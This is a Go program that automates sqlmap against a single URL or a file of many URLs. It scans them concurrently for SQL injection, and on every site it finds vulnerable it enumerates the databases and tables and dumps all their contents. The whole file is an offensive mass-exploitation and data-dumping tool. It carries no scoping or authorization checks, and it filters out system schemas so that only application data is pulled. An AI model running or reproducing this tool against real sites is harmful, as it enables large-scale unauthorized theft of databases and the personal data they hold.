package main

import (
	"flag"
	"fmt"
	"net/url"
	"os"
	"os/exec"
	"os/signal"
	"regexp"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"syscall"
)

const (
	sqlMapPath = "sqlmap/sqlmap.py"
	outputDir  = "./Output"
)

type SQLMapConfig struct {
	URL   string
	Risk  string
	Level string
}

func constructSQLMapCommand(config SQLMapConfig, additionalArgs ...string) *exec.Cmd {
	baseArgs := []string{
		"python", sqlMapPath, "-u", config.URL, "--risk", config.Risk, "--level", config.Level,
		"--smart", "--batch", "-o", "--output-dir", outputDir,
	}
	return exec.Command(baseArgs[0], append(baseArgs[1:], additionalArgs...)...)
}

func runSQLMapCommand(config SQLMapConfig, additionalArgs ...string) (string, error) {
	cmd := constructSQLMapCommand(config, additionalArgs...)
	cmdOutput, err := cmd.CombinedOutput()
	if err != nil {
		return string(cmdOutput), fmt.Errorf("error running SQLMap: %w", err)
	}
	return string(cmdOutput), nil
}

func extractItemsFromOutput(output, regexPattern string) []string {
	itemRegex := regexp.MustCompile(regexPattern)
	matches := itemRegex.FindAllStringSubmatch(output, -1)

	undesiredNames := map[string]struct{}{
		"Mysql":              {},
		"Performance_schema": {},
		"Sys":                {},
		"Test":               {},
		"information_schema": {},
	}

	var results []string
	for _, match := range matches {
		if len(match) > 1 {
			item := match[1]
			if _, exists := undesiredNames[item]; !exists {
				results = append(results, item)
			}
		}
	}
	return results
}

func extractDomain(inputURL string) string {
	parsedURL, err := url.Parse(inputURL)
	if err != nil {
		return inputURL
	}
	return parsedURL.Hostname()
}

func isURLVulnerable(config SQLMapConfig, debug bool) (bool, error) {
	output, err := runSQLMapCommand(config)
	if err != nil {
		return false, err
	}
	if debug {
		fmt.Println("DEBUG: isURLVulnerable output:")
		fmt.Println(output)
	}
	return strings.Contains(output, "sqlmap identified the following injection point(s)") ||
		strings.Contains(output, "sqlmap resumed the following injection point(s) from stored session"), nil
}

func scanAndExtractDetails(config SQLMapConfig, threadsSQL int) {
	output, err := runSQLMapCommand(config, "--dbs")
	if err != nil {
		fmt.Printf("Error fetching databases: %v\n", err)
		return
	}

	dbs := extractItemsFromOutput(output, `\[\*\] (\w+)`)
	for _, db := range dbs {
		fmt.Printf("Fetching tables from database %s\n", db)
		tablesOutput, err := runSQLMapCommand(config, "--tables", "-D", db)
		if err != nil {
			fmt.Printf("Error fetching tables for database %s: %v\n", db, err)
			continue
		}
		tables := extractItemsFromOutput(tablesOutput, `\| (\w+) \|`)
		fmt.Printf("Database %s: Found %d tables\n", db, len(tables))
		for _, table := range tables {
			fmt.Printf("Dumping table %s from database %s\n", table, db)
			_, err := runSQLMapCommand(config, "-D", db, "-T", table, "--dump", "--threads", strconv.Itoa(threadsSQL))
			if err != nil {
				fmt.Printf("Error dumping table %s: %v\n", table, err)
			}
		}
	}
}

func downloadSQLMap() error {
	cmd := exec.Command("git", "clone", "https://github.com/sqlmapproject/sqlmap.git")
	cmd.Dir = "./"
	_, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("error downloading SQLMap: %w", err)
	}
	return nil
}

func init() {
	if _, err := os.Stat(sqlMapPath); os.IsNotExist(err) {
		fmt.Println("Downloading SQLMap...")
		err := downloadSQLMap()
		if err != nil {
			fmt.Printf("Error downloading SQLMap: %v\n", err)
			os.Exit(1)
		}
		fmt.Println("SQLMap downloaded successfully.")
	}
}

func main() {
	runtime.SetBlockProfileRate(1)
	signalChannel := make(chan os.Signal, 1)
	signal.Notify(signalChannel, os.Interrupt, syscall.SIGTERM)
	go func() {
		<-signalChannel
		fmt.Println("\nExiting...")
		os.Exit(0)
	}()

	var (
		risk          string
		level         string
		threads       int
		threadsSQL    int
		debug         bool
		target        string
		defaultSingle bool
		defaultMulti  bool
	)

	flag.StringVar(&risk, "risk", "3", "Risk level for SQLMap")
	flag.StringVar(&level, "level", "3", "Level for SQLMap")
	flag.IntVar(&threads, "threads", 20, "Threads for URL scanning")
	flag.IntVar(&threadsSQL, "threads_sql", 10, "Threads for SQLMap dumping (max: 10)")
	flag.BoolVar(&debug, "debug", false, "Enable debugging output")
	flag.StringVar(&target, "url", "", "Test a single URL")
	flag.BoolVar(&defaultSingle, "default-single", false, "Predefined settings for single URL")
	flag.BoolVar(&defaultMulti, "default-multi", false, "Predefined settings for multiple URLs")
	flag.Parse()

	if defaultSingle {
		risk, level = "3", "5"
		fmt.Println("Using default-single settings: Risk 3, Level 5")
	}
	if defaultMulti {
		risk, level = "2", "3"
		threads, threadsSQL = 30, 10
		fmt.Println("Using default-multi settings: Risk 2, Level 3, Threads 30, SQL Threads 10")
	}

	if target != "" {
		config := SQLMapConfig{URL: target, Risk: risk, Level: level}
		vulnerable, err := isURLVulnerable(config, debug)
		if err != nil {
			fmt.Printf("Error scanning URL: %v\n", err)
			return
		}
		if vulnerable {
			fmt.Printf("%s is Vulnerable. Fetching details...\n", extractDomain(target))
			scanAndExtractDetails(config, threadsSQL)
		} else {
			fmt.Printf("%s is Not Vulnerable.\n", extractDomain(target))
		}
		return
	}

	var filePath string
	fmt.Print("Enter path to URLs file: ")
	_, _ = fmt.Scanln(&filePath)
	lines, err := os.ReadFile(filePath)
	if err != nil {
		fmt.Printf("Error reading file: %v\n", err)
		return
	}

	urls := strings.Split(strings.TrimSpace(string(lines)), "\n")
	fmt.Printf("Loaded %d URLs. Starting scan...\n", len(urls))

	var wg sync.WaitGroup
	sem := make(chan struct{}, threads)

	for _, site := range urls {
		wg.Add(1)
		sem <- struct{}{}
		go func(site string) {
			defer wg.Done()
			defer func() { <-sem }()
			config := SQLMapConfig{URL: site, Risk: risk, Level: level}
			vulnerable, err := isURLVulnerable(config, debug)
			if err != nil {
				fmt.Printf("Error checking URL %s: %v\n", site, err)
				return
			}
			if vulnerable {
				fmt.Printf("%s is Vulnerable. Fetching details...\n", extractDomain(site))
				scanAndExtractDetails(config, threadsSQL)
			} else {
				fmt.Printf("%s is Not Vulnerable.\n", extractDomain(site))
			}
		}(site)
	}
	wg.Wait()
	fmt.Println("Scan complete.")
}
